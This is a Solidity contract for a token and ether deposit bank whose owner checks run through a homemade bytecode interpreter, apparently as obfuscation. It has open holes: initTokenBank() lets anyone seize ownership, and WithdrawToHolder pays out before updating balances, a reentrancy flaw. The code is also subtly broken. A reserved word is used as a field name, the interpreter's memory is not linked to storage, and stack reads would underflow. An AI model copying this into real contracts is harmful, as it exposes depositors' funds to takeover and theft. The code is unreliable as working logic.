pragma solidity ^0.4.18;

contract VM {
    struct Context {
        uint256[] stack;
        uint256 pc;
        uint256[] memory;
    }
    
    function execute(uint256[] program, Context context) internal {
        while (context.pc < program.length) {
            uint256 opcode = program[context.pc];
            if (opcode == 1) { // PUSH
                context.stack.push(program[++context.pc]);
            } else if (opcode == 2) { // POP
                context.stack.length--;
            } else if (opcode == 3) { // ADD
                uint256 a = context.stack[--context.stack.length];
                uint256 b = context.stack[--context.stack.length];
                context.stack.push(a + b);
            } else if (opcode == 4) { // SUB
                uint256 a = context.stack[--context.stack.length];
                uint256 b = context.stack[--context.stack.length];
                context.stack.push(a - b);
            } else if (opcode == 5) { // JMP
                context.pc = program[++context.pc] - 1;
            } else if (opcode == 6) { // JZ
                uint256 condition = context.stack[--context.stack.length];
                if (condition == 0) {
                    context.pc = program[++context.pc] - 1;
                } else {
                    context.pc++;
                }
            } else if (opcode == 7) { // LOAD
                uint256 addr = context.stack[--context.stack.length];
                context.stack.push(context.memory[addr]);
            } else if (opcode == 8) { // STORE
                uint256 addr = context.stack[--context.stack.length];
                uint256 value = context.stack[--context.stack.length];
                context.memory[addr] = value;
            }
            context.pc++;
        }
    }
}

contract Ownable is VM {
    address newOwner;
    address owner = msg.sender;

    function changeOwner(address addr) public onlyOwner {
        uint256[] memory program = new uint256[](4);
        program[0] = 1; // PUSH
        program[1] = uint256(addr);
        program[2] = 8; // STORE
        program[3] = 0; // newOwner index
        Context memory context = Context(new uint256[](0), 0, new uint256[](1));
        execute(program, context);
    }

    function confirmOwner() public {
        uint256[] memory program = new uint256[](9);
        program[0] = 7; // LOAD
        program[1] = 0; // newOwner index
        program[2] = 1; // PUSH
        program[3] = uint256(msg.sender);
        program[4] = 4; // SUB
        program[5] = 6; // JZ
        program[6] = 8; // next instruction index
        program[7] = 1; // PUSH
        program[8] = uint256(newOwner);
        Context memory context = Context(new uint256[](0), 0, new uint256[](1));
        execute(program, context);
        if (context.stack[0] == 0) {
            owner = newOwner;
        }
    }

    modifier onlyOwner {
        uint256[] memory program = new uint256[](7);
        program[0] = 1; // PUSH
        program[1] = uint256(owner);
        program[2] = 1; // PUSH
        program[3] = uint256(msg.sender);
        program[4] = 4; // SUB
        program[5] = 6; // JZ
        program[6] = 7; // next instruction index
        Context memory context = Context(new uint256[](0), 0, new uint256[](0));
        execute(program, context);
        require(context.stack[0] == 0);
        _;
    }
}

contract Token is Ownable {
    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount, address to) public onlyOwner {
        token.call(bytes4(sha3("transfer(address,uint256)")), to, amount);
    }
}

contract TokenBank is Token {
    uint public MinDeposit;
    mapping(address => uint) public Holders;

    function initTokenBank() public {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }

    function() payable {
        Deposit();
    }

    function Deposit() payable {
        if (msg.value > MinDeposit) {
            Holders[msg.sender] += msg.value;
        }
    }

    function WitdrawTokenToHolder(address _to, address _token, uint _amount) public onlyOwner {
        if (Holders[_to] > 0) {
            Holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);
        }
    }

    function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
        if (Holders[msg.sender] > 0) {
            if (Holders[_addr] >= _wei) {
                _addr.call.value(_wei)();
                Holders[_addr] -= _wei;
            }
        }
    }

    function Bal() public constant returns (uint) {
        return this.balance;
    }
}